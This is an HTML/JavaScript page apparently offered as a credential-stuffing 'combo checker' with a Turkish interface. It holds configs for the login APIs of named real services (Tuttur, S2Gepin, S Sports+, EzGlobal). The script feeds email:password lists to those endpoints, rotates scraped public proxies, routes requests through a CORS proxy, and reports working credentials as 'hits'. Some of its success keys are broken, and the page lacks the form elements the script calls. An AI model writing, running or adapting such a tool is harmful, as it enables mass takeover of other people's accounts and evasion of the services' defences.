<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sezin Checker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #fff;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px 0;
        }

        .header h1 {
            font-size: 3em;
            font-weight: 700;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            background-size: 400% 400%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 15s ease infinite;
            margin-bottom: 15px;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .header p {
            font-size: 1.2em;
            opacity: 0.9;
            font-weight: 300;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        .panel {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .panel:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(31, 38, 135, 0.5);
        }

        .panel h2 {
            margin-bottom: 25px;
            font-size: 1.6em;
            color: #fff;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .icon {
            width: 24px;
            height: 24px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #fff;
            font-size: 0.95em;
        }

        select, textarea, input {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            background: rgba(255,255,255,0.95);
            color: #333;
            font-size: 14px;
            resize: vertical;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }

        select:focus, textarea:focus, input:focus {
            outline: none;
            background: rgba(255,255,255,1);
            border-color: #4ecdc4;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(78, 205, 196, 0.3);
        }

        textarea {
            min-height: 150px;
            font-family: 'Courier New', monospace;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn-primary {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            color: white;
            width: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(255, 107, 107, 0.4);
        }

        .btn-primary:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }

        .results-panel {
            grid-column: 1 / -1;
            margin-top: 20px;
        }

        .results-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .result-box {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(255,255,255,0.1);
        }

        .result-box h3 {
            margin-bottom: 15px;
            font-size: 1.2em;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .hit {
            border-left: 4px solid #4ecdc4;
        }

        .bad {
            border-left: 4px solid #ff6b6b;
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-hit {
            background: rgba(78, 205, 196, 0.2);
            color: #4ecdc4;
        }

        .badge-bad {
            background: rgba(255, 107, 107, 0.2);
            color: #ff6b6b;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 20px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4ecdc4, #45b7d1);
            width: 0%;
            transition: width 0.3s ease;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-item {
            text-align: center;
            padding: 15px;
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
        }

        .stat-number {
            font-size: 2em;
            font-weight: 700;
            margin-bottom: 5px;
        }

        .stat-label {
            font-size: 0.9em;
            opacity: 0.8;
        }

        .config-info {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .combo-result {
            padding: 8px 12px;
            margin: 5px 0;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .combo-hit {
            background: rgba(78, 205, 196, 0.1);
            border: 1px solid rgba(78, 205, 196, 0.3);
            color: #4ecdc4;
        }

        .combo-bad {
            background: rgba(255, 107, 107, 0.1);
            border: 1px solid rgba(255, 107, 107, 0.3);
            color: #ff6b6b;
        }

        .tooltip {
            position: relative;
            display: inline-block;
            cursor: help;
        }

        .tooltip .tooltiptext {
            visibility: hidden;
            width: 200px;
            background-color: rgba(0,0,0,0.8);
            color: #fff;
            text-align: center;
            border-radius: 6px;
            padding: 8px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            margin-left: -100px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .tooltip:hover .tooltiptext {
            visibility: visible;
            opacity: 1;
        }

        .advanced-options {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 12px;
            margin-top: 20px;
        }

        .error-message {
            background: rgba(255, 107, 107, 0.2);
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: none;
            font-size: 0.9em;
        }

        @media (max-width: 768px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .stats {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .header h1 {
                font-size: 2em;
            }
        }
    </style>
</head>
<body>

    <script>
        // Config definitions
        const configs = {
            ezglobal: {
                name: "EzGlobal",
                author: "sezin",
                url: "https://www.ezglobalyazilim.com/ajax.php",
                method: "POST",
                data: "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={USER}&sifre={PASS}&ajtip=eval",
                successKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadƒ±r.`);",
                failureKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadƒ±r.`);"
            },
            tuttur: {
                name: "Tuttur.com",
                author: "sezin",
                url: "https://tapi.tuttur.com/v1/auth/login",
                method: "POST",
                data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
                successKey: '"success":true,',
                failureKey: '"success":false,'
            },
            s2gepin: {
                name: "S2Gepin",
                author: "sezin",
                url: "https://api.s2gepin.com/Login/Customer",
                method: "POST",
                data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
                successKey: '"success":true,',
                failureKey: '"success":false,'
            },
            ssport: {
                name: "S Sports+",
                author: "sezin",
                url: "https://api.ssportplus.com/MW/SubscriberLogin",
                method: "POST",
                data: '{"action":"SubscriberLogin","subscriber":{"LoginPreferedMethod":0,"UILanguage":"tr","Email":"{USER}","PIN":"{PASS}"},"Devices":[{"PlatformID":10}],"TSID":1700250190,"SNGT":"282633486942740668772593320738"}',
                successKey: '"SessionIsAlive": false"',
                failureKey: '"SessionIsAlive": false'
            }
        };

        let isChecking = false;
        let checkStats = {
            total: 0,
            checked: 0,
            hits: 0,
            bad: 0
        };

        // Proxy fetch function
        async function fetchProxies() {
            try {
                const response = await fetch('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=10000&country=all&ssl=all&anonymity=all');
                const proxyText = await response.text();
                return proxyText.split('\n').filter(p => p.trim() && /^(\d{1,3}\.){3}\d{1,3}:\d{1,5}$/.test(p.trim()));
            } catch (error) {
                showError('Proxy listesi alƒ±namadƒ±: ' + error.message);
                return [];
            }
        }

        // Config selection event
        document.getElementById('configSelect').addEventListener('change', function() {
            const selectedConfig = this.value;
            const customGroup = document.getElementById('customConfigGroup');
            const configInfo = document.getElementById('configInfo');
            
            if (selectedConfig === 'custom') {
                customGroup.style.display = 'block';
                configInfo.innerHTML = '';
            } else {
                customGroup.style.display = 'none';
                if (selectedConfig && configs[selectedConfig]) {
                    const config = configs[selectedConfig];
                    configInfo.innerHTML = `
                        <strong>Config:</strong> ${config.name}<br>
                        <strong>Author:</strong> ${config.author}
                    `;
                } else {
                    configInfo.innerHTML = '';
                }
            }
        });

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
            setTimeout(() => errorDiv.style.display = 'none', 5000);
        }

        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
        }

        async function startChecking() {
            if (isChecking) return;
            
            const configSelect = document.getElementById('configSelect').value;
            const comboList = document.getElementById('comboList').value.trim();
            const autoRetry = document.getElementById('autoRetry').checked;
            const threadCount = parseInt(document.getElementById('threadCount').value) || 5;

            // Input validation
            if (!configSelect) {
                showError('L√ºtfen bir config se√ßin!');
                return;
            }
            
            if (!comboList) {
                showError('L√ºtfen combo listesi girin!');
                return;
            }

            // Parse combos
            const combos = comboList.split('\n')
                .filter(line => line.trim())
                .map(line => {
                    const [email, pass] = line.trim().split(':');
                    return { email: email?.trim(), pass: pass?.trim() };
                })
                .filter(combo => combo.email && combo.pass && validateEmail(combo.email));

            if (combos.length === 0) {
                showError('Ge√ßerli combo bulunamadƒ±! Format: email:password');
                return;
            }

            // Fetch proxies
            const proxyList = await fetchProxies();
            if (proxyList.length === 0) {
                showError('Ge√ßerli proxy alƒ±namadƒ±! L√ºtfen tekrar deneyin.');
                return;
            }

            // UI updates
            isChecking = true;
            const checkButton = document.getElementById('checkButton');
            checkButton.disabled = true;
            document.getElementById('checkButtonText').style.display = 'none';
            document.getElementById('checkLoading').style.display = 'inline-block';
            document.getElementById('resultsPanel').style.display = 'block';
            
            // Reset stats
            checkStats = {
                total: combos.length,
                checked: 0,
                hits: 0,
                bad: 0
            };
            document.getElementById('hitResults').innerHTML = '';
            document.getElementById('badResults').innerHTML = '';
            updateStats();

            const config = configSelect === 'custom' ? 
                parseCustomConfig(document.getElementById('customConfig').value) :
                configs[configSelect];

            // Process combos in chunks for threading
            const chunkSize = Math.ceil(combos.length / threadCount);
            const promises = [];

            for (let t = 0; t < threadCount; t++) {
                const chunk = combos.slice(t * chunkSize, (t + 1) * chunkSize);
                promises.push(processChunk(chunk, config, proxyList, autoRetry));
            }

            await Promise.all(promises);

            // Checking completed
            isChecking = false;
            checkButton.disabled = false;
            document.getElementById('checkButtonText').style.display = 'inline-block';
            document.getElementById('checkLoading').style.display = 'none';
        }

        async function processChunk(chunk, config, proxyList, autoRetry) {
            for (const combo of chunk) {
                let success = false;
                let errorMsg = 'No response';
                const retries = autoRetry ? 3 : 1;

                for (let r = 0; r < retries; r++) {
                    for (const proxy of proxyList) {
                        try {
                            const result = await checkCombo(combo, config, proxy);
                            if (result.success) {
                                success = true;
                                break;
                            } else {
                                errorMsg = result.error;
                            }
                        } catch (error) {
                            errorMsg = error.message || 'Request failed';
                        }
                        if (success) break;
                        await sleep(100);
                    }
                    if (success) break;
                    await sleep(500);
                }

                if (success) {
                    checkStats.hits++;
                    addResult('hit', combo);
                } else {
                    checkStats.bad++;
                    addResult('bad', combo, errorMsg);
                }
                
                checkStats.checked++;
                updateStats();
                updateProgress();
                await sleep(100);
            }
        }

        async function checkCombo(combo, config, proxy) {
            // Use CORS proxy to bypass CORS issues
            const corsProxy = 'https://cors-anywhere.herokuapp.com/';
            const targetUrl = config.url;
            const postData = config.data.replace('{USER}', combo.email).replace('{PASS}', combo.pass);

            try {
                const response = await fetch(corsProxy + targetUrl, {
                    method: config.method,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded', // Adjust if needed for JSON
                        'Origin': window.location.origin
                    },
                    body: postData
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const responseText = await response.text();
                const isSuccess = responseText.includes(config.successKey);

                return {
                    success: isSuccess,
                    error: isSuccess ? '' : (responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error')
                };
            } catch (error) {
                return { success: false, error: error.message || 'Request failed. Note: Visit https://cors-anywhere.herokuapp.com/corsdemo to request temporary access for the CORS proxy.' };
            }
        }

        function addResult(type, combo, errorMsg = '') {
            const container = document.getElementById(type + 'Results');
            const resultDiv = document.createElement('div');
            resultDiv.className = `combo-result combo-${type}`;
            
            let content = `${combo.email}:${combo.pass}`;
            if (type === 'bad' && errorMsg) {
                content += ` | Error: ${errorMsg}`;
            }
            
            resultDiv.innerHTML = content;
            container.appendChild(resultDiv);
            container.scrollTop = container.scrollHeight;
        }

        function updateStats() {
            document.getElementById('totalChecked').textContent = checkStats.checked;
            document.getElementById('totalHits').textContent = checkStats.hits;
            document.getElementById('totalBad').textContent = checkStats.bad;
            document.getElementById('hitCount').textContent = checkStats.hits;
            document.getElementById('badCount').textContent = checkStats.bad;
            
            const successRate = checkStats.checked > 0 ? 
                ((checkStats.hits / checkStats.checked) * 100).toFixed(1) : '0';
            document.getElementById('successRate').textContent = successRate + '%';
        }

        function updateProgress() {
            const progress = checkStats.checked / checkStats.total * 100;
            document.getElementById('progressFill').style.width = progress + '%';
        }

        function parseCustomConfig(configText) {
            try {
                const json = JSON.parse(configText);
                return {
                    name: json.name || "Custom Config",
                    author: json.author || "User",
                    url: json.url || "https://example.com",
                    method: json.method || "POST",
                    data: json.data || "",
                    successKey: json.successKey || '"success":true',
                    failureKey: json.failureKey || '"success":false'
                };
            } catch {
                return {
                    name: "Custom Config",
                    author: "User",
                    url: "https://example.com",
                    method: "POST",
                    data: configText,
                    successKey: '"success":true',
                    failureKey: '"success":false'
                };
            }
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
